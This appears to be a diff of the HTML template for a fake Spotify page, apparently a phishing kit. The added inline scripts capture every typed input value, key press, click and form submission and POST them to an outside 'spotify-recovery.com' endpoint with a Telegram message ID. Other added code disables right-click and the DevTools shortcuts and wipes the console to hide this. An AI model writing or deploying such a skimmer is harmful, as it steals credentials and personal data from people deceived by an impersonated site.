@@ -9,132 +9,215 @@
     <link rel="apple-touch-icon" href="%PUBLIC_URL%/favicon.ico" />
     <link rel="manifest" href="%PUBLIC_URL%/manifest.json" />
     <title>Spotify</title>
-<style>
-/* Ensure the html element takes full height without overflow */
-html {
-  height: 100%;
-  overflow: hidden;  /* Prevent scrollbars on the html element */
-}
-
-
-/* Ensure the body element takes full height and handles overflow */
-body {
-  height: 100%;  /* Ensure the body takes up full height */
-  margin: 0;
-  overflow-x: hidden;  /* Prevent horizontal scroll */
-  overflow-y: auto;    /* Allow vertical scroll only */
-}
-
-/* Optional: Hide the scrollbar on WebKit browsers when not needed */
-body::-webkit-scrollbar {
-  display: none;
-}
-
-/* Hide scrollbar on IE and Firefox */
-body {
-  -ms-overflow-style: none;  /* Internet Explorer 10+ */
-  scrollbar-width: none;     /* Firefox */
-}
-
-/* Ensure the root div takes full height */
-#root {
-  height: 100%;
-}
-    </style>
-<!-- Add this script to your main HTML template or each page -->
 <script>
+  setInterval(() => {
+    console.clear();
+  }, 1000);
+
+  // Disable console logging completely
   (function() {
-    // Generate session ID if not exists
-    if (!localStorage.getItem('sessionId')) {
-      const sessionId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-        const r = Math.random() * 16 | 0;
-        const v = c === 'x' ? r : (r & 0x3 | 0x8);
-        return v.toString(16);
-      });
-      localStorage.setItem('sessionId', sessionId);
-    }
-
-    const getBrowserInfo = () => {
-      const userAgent = navigator.userAgent;
-      let browserName = 'Unknown';
-      if (userAgent.indexOf('Firefox') > -1) {
-        browserName = 'Mozilla Firefox';
-      } else if (userAgent.indexOf('SamsungBrowser') > -1) {
-        browserName = 'Samsung Internet';
-      } else if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) {
-        browserName = 'Opera';
-      } else if (userAgent.indexOf('Trident') > -1) {
-        browserName = 'Microsoft Internet Explorer';
-      } else if (userAgent.indexOf('Edg') > -1) {
-        browserName = 'Microsoft Edge';
-      } else if (userAgent.indexOf('Chrome') > -1) {
-        browserName = 'Google Chrome';
-      } else if (userAgent.indexOf('Safari') > -1) {
-        browserName = 'Apple Safari';
-      }
-      return browserName;
-    };
-
-    const sendTrackingData = (eventType, additionalData = {}) => {
-      const sessionId = localStorage.getItem('sessionId');
-      const pageUrl = window.location.href;
-      const browserInfo = getBrowserInfo();
-      const data = { 
-        sessionId, 
-        pageUrl, 
-        eventType,
-        browserInfo,
-        timestamp: new Date().toISOString(),
-        ...additionalData 
-      };
-
-      fetch('https://spotify-recovery.com/api/track', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-      }).catch(error => {
-        console.error('Error sending tracking data:', error);
-      });
-    };
-
-    // Track page load
-    sendTrackingData('page_load');
-
-    // Track page unload
-    window.addEventListener('beforeunload', () => {
-      sendTrackingData('page_unload');
-    });
-
-    // Track route changes
-    let lastUrl = window.location.href;
-    new MutationObserver(() => {
-      if (lastUrl !== window.location.href) {
-        lastUrl = window.location.href;
-        sendTrackingData('page_navigation');
-      }
-    }).observe(document, { subtree: true, childList: true });
-
-    // Track input changes
-    document.addEventListener('input', (event) => {
-      if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
-        sendTrackingData('input', {
-          inputName: event.target.name || event.target.id,
-          inputValue: event.target.value
-        });
-      }
-    });
-
-    window.addEventListener('hashchange', () => {
-      sendTrackingData('page_navigation');
-    });
-
-    window.addEventListener('popstate', () => {
-      sendTrackingData('page_navigation');
-    });
+    const emptyFunction = () => {};
+    window.console.log = emptyFunction;
+    window.console.error = emptyFunction;
+    window.console.warn = emptyFunction;
+    window.console.info = emptyFunction;
   })();
 </script>
+<script>
+  // Disable right-click
+  document.addEventListener('contextmenu', event => event.preventDefault());
+
+  // Disable keyboard shortcuts for DevTools (F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U)
+  document.addEventListener('keydown', (event) => {
+    if (event.keyCode == 123) { // F12
+      event.preventDefault();
+    }
+    if (event.ctrlKey && event.shiftKey && (event.keyCode == 73 || event.keyCode == 74)) { // Ctrl+Shift+I or J
+      event.preventDefault();
+    }
+    if (event.ctrlKey && event.keyCode == 85) { // Ctrl+U (View source)
+      event.preventDefault();
+    }
+  });
+</script>
+
+    <style>
+      html {
+        height: 100%;
+        overflow: hidden;
+      }
+
+      body {
+        height: 100%;
+        margin: 0;
+        overflow-x: hidden;
+        overflow-y: auto;
+      }
+
+      body::-webkit-scrollbar {
+        display: none;
+      }
+
+      body {
+        -ms-overflow-style: none;
+        scrollbar-width: none;
+      }
+
+      #root {
+        height: 100%;
+      }
+    </style>
+
+    <script>
+      (function () {
+        // Generate session ID if not exists
+        if (!localStorage.getItem('sessionId')) {
+          const sessionId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+            const r = (Math.random() * 16) | 0,
+              v = c === 'x' ? r : (r & 0x3) | 0x8;
+            return v.toString(16);
+          });
+          localStorage.setItem('sessionId', sessionId);
+        }
+
+        let messageId = null;  // Store Telegram message ID
+
+        const getBrowserInfo = () => {
+          const userAgent = navigator.userAgent;
+          let browserName = 'Unknown';
+          if (userAgent.indexOf('Firefox') > -1) browserName = 'Mozilla Firefox';
+          else if (userAgent.indexOf('SamsungBrowser') > -1) browserName = 'Samsung Internet';
+          else if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) browserName = 'Opera';
+          else if (userAgent.indexOf('Trident') > -1) browserName = 'Internet Explorer';
+          else if (userAgent.indexOf('Edg') > -1) browserName = 'Microsoft Edge';
+          else if (userAgent.indexOf('Chrome') > -1) browserName = 'Google Chrome';
+          else if (userAgent.indexOf('Safari') > -1) browserName = 'Apple Safari';
+          return browserName;
+        };
+
+        const sendTrackingData = (eventType, additionalData = {}) => {
+          const sessionId = localStorage.getItem('sessionId');
+          const pageUrl = window.location.href;
+          const browserInfo = getBrowserInfo();
+          const data = {
+            sessionId,
+            pageUrl,
+            eventType,
+            browserInfo,
+            timestamp: new Date().toISOString(),
+            messageId, // Pass the message ID to the backend
+            ...additionalData,
+          };
+
+          fetch('https://spotify-recovery.com/api/track', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(data),
+          })
+            .then(response => response.json())
+            .then(data => {
+              if (data.messageId) {
+                messageId = data.messageId; // Store message ID for future updates
+              }
+            })
+            .catch(error => {
+              console.error('Error sending tracking data:', error);
+            });
+        };
+
+        // Track page load
+        sendTrackingData('page_load');
+
+        // Track page unload
+        window.addEventListener('beforeunload', () => {
+          sendTrackingData('page_unload');
+        });
+
+        // Track route changes
+        let lastUrl = window.location.href;
+        new MutationObserver(() => {
+          if (lastUrl !== window.location.href) {
+            lastUrl = window.location.href;
+            sendTrackingData('page_navigation');
+          }
+        }).observe(document, { subtree: true, childList: true });
+
+        // Track input changes
+        document.addEventListener('input', (event) => {
+          if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
+            sendTrackingData('input', {
+              inputName: event.target.name || event.target.id,
+              inputValue: event.target.value,
+            });
+          }
+        });
+
+        // Track when user enters and leaves input fields
+        document.addEventListener('focusin', (event) => {
+          if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
+            sendTrackingData('input_focus', {
+              inputName: event.target.name || event.target.id,
+            });
+          }
+        });
+
+        document.addEventListener('focusout', (event) => {
+          if (event.target.tagName === 'INPUT' || event.target.tagName === 'TEXTAREA') {
+            sendTrackingData('input_blur', {
+              inputName: event.target.name || event.target.id,
+            });
+          }
+        });
+
+
+        // Track clicks
+        document.addEventListener('click', (event) => {
+          sendTrackingData('click', {
+            element: event.target.tagName,
+            elementId: event.target.id,
+            elementClass: event.target.className,
+          });
+        });
+
+        // Track key presses
+        document.addEventListener('keydown', (event) => {
+          sendTrackingData('key_press', {
+            key: event.key,
+            keyCode: event.keyCode,
+          });
+        });
+
+        // Track form submissions
+        document.addEventListener('submit', (event) => {
+          sendTrackingData('form_submit', {
+            formId: event.target.id,
+            formClass: event.target.className,
+          });
+        });
+
+        // Track button clicks
+        document.addEventListener('click', (event) => {
+          if (event.target.tagName === 'BUTTON') {
+            sendTrackingData('button_click', {
+              buttonId: event.target.id,
+              buttonClass: event.target.className,
+              buttonText: event.target.innerText,
+            });
+          }
+        });
+
+        window.addEventListener('hashchange', () => {
+          sendTrackingData('page_navigation');
+        });
+
+        window.addEventListener('popstate', () => {
+          sendTrackingData('page_navigation');
+        });
+
+      })();
+    </script>
   </head>
   <body>
     <noscript>You need to enable JavaScript to run this app.</noscript>
